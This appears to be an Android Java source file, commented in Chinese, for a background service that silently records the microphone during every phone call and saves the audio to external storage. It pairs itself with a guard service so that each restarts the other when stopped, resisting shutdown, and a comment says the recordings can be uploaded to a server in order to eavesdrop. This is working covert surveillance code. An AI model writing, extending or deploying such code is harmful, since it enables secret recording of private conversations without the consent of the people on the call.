package com.chenxulu.pm;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;

public class PhoneService extends Service {
    //电话管理器
    private TelephonyManager mTelephonyManager;
    //监听器对象
    private MyPhoneListener mListener;
    //声明录音机
    private MediaRecorder mediaRecorder;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * 服务创建的时候调用的方法
     */
    @Override
    public void onCreate() {
        super.onCreate();
        startGuardService();

        // 后台监听电话的呼叫状态,得到电话管理器
        mTelephonyManager = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        mListener = new MyPhoneListener();
        mTelephonyManager.listen(mListener, PhoneStateListener.LISTEN_CALL_STATE);
    }

    private class MyPhoneListener extends PhoneStateListener {
        // 当电话的呼叫状态发生变化的时候调用的方法
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            switch (state) {
                case TelephonyManager.CALL_STATE_IDLE://空闲状态。
                    stopRecord();
                    break;
                case TelephonyManager.CALL_STATE_RINGING://零响状态。
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK://通话状态
                    startRecord();
                    break;
                default:
                    break;
            }
        }
    }

    /**
     * 开始录音
     */
    private void startRecord() {
        try {
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

            String fileDir = Environment.getExternalStorageDirectory().toString();
            String fileName = System.currentTimeMillis() + ".amr";
            File file = new File(fileDir, fileName);
            mediaRecorder.setOutputFile(file.getAbsolutePath());

            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (Exception e) {

        }
    }

    /**
     * 结束录音，释放资源
     */
    private void stopRecord() {
        if (mediaRecorder != null) {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            //TODO 这个地方你可以将录制完毕的音频文件上传到服务器，这样就可以监听了
            Log.i("SystemService", "音频文件录制完毕，可以在后台上传到服务器");
        }
    }

    /**
     * 采取线程守护的方法，当一个服务关闭后，开启另外一个服务，除非你很快把两个服务同时关闭才能完成
     */
    private void startGuardService() {
        Intent intent = new Intent(this, GuardService.class);
        startService(intent);
    }

    /**
     * 服务销毁的时候调用的方法
     */
    @Override
    public void onDestroy() {
        super.onDestroy();
        // 取消电话的监听
        mTelephonyManager.listen(mListener, PhoneStateListener.LISTEN_NONE);
        mListener = null;

        startGuardService();
    }

}
